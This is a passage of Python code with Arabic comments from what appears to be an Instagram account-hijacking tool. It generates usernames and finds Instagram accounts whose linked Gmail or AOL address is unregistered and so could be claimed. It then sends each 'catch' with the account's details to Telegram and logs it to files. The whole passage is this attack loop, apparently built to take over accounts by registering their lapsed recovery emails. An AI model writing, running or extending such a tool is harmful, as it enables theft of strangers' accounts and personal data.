            time.sleep(0.5)
            continue
        
        with counters_lock:
            total_generated += 1
        
        if '_' in username:
            continue
        
        # فحص Gmail أولاً
        gmail_email = username + GMAIL_DOMAIN
        ig_registered_gmail = insta_check(gmail_email)
        
        if ig_registered_gmail:
            with counters_lock:
                instagram_taken += 1
            
            google_status = google_check(username)
            if google_status is True:  # البريد متاح في Gmail
                with counters_lock:
                    google_available += 1
                
                # جلب معلومات الحساب
                insta_info = get_instagram_info(username)
                if insta_info:
                    creation_year = year  # السنة التي تم التوليد منها
                    send_to_telegram(gmail_email, "Gmail", insta_info, creation_year)
                    with counters_lock:
                        valid_hits_gmail += 1
                    with open("valid_gmail_accounts.txt", "a", encoding='utf-8') as f:
                        f.write(f"{gmail_email} | Year: {creation_year} | Username: {username}\n")
                    print(f"{Colors.SUCCESS}{ICONS['AVAILABLE']} Gmail صيد: {gmail_email} (سنة {creation_year}){Colors.RESET}")
                else:
                    print(f"{Colors.WARNING}{ICONS['WARNING']} فشل جلب معلومات الحساب لـ {username}{Colors.RESET}")
            
            elif google_status is False:
                with counters_lock:
                    google_unavailable += 1
                print(f"{Colors.WARNING}{ICONS['TAKEN']} Gmail مسجل في جوجل: {gmail_email}{Colors.RESET}")
            else:
                with counters_lock:
                    google_errors += 1
                print(f"{Colors.FAIL}{ICONS['ERROR']} فشل فحص جوجل: {gmail_email}{Colors.RESET}")
        
        else:  # Gmail غير مسجل → ننتقل إلى AOL
            with counters_lock:
                instagram_not_taken += 1
            print(f"{Colors.INFO}{ICONS['INSTAGRAM']} Gmail غير مسجل في إنستغرام: {gmail_email}{Colors.RESET}")
            
            aol_email = username + AOL_DOMAIN
            ig_registered_aol = insta_check(aol_email)
            
            if ig_registered_aol:
                with counters_lock:
                    instagram_taken += 1
                    aol_checked += 1
                
                aol_status = aol_check(aol_email)
                
                if aol_status is True:  # متاح في AOL
                    with counters_lock:
                        aol_available += 1
                    
                    insta_info = get_instagram_info(username)
                    if insta_info:
                        creation_year = year
                        send_to_telegram(aol_email, "AOL", insta_info, creation_year)
                        with counters_lock:
                            valid_hits_aol += 1
                        with open("valid_aol_accounts.txt", "a", encoding='utf-8') as f:
                            f.write(f"{aol_email} | Year: {creation_year} | Username: {username}\n")
                        print(f"{Colors.SUCCESS}{ICONS['AVAILABLE']} AOL صيد: {aol_email} (سنة {creation_year}){Colors.RESET}")
                    else:
                        print(f"{Colors.WARNING}{ICONS['WARNING']} فشل جلب معلومات الحساب لـ {username}{Colors.RESET}")
                
                elif aol_status is False:
                    with counters_lock:
                        aol_unavailable += 1
                    print(f"{Colors.WARNING}{ICONS['TAKEN']} AOL مسجل: {aol_email}{Colors.RESET}")
                else:
                    with counters_lock:
                        aol_errors += 1
                    print(f"{Colors.FAIL}{ICONS['ERROR']} فشل فحص AOL: {aol_email}{Colors.RESET}")
            else:
                print(f"{Colors.INFO}{ICONS['INSTAGRAM']} AOL غير مسجل في إنستغرام: {aol_email}{Colors.RESET}")

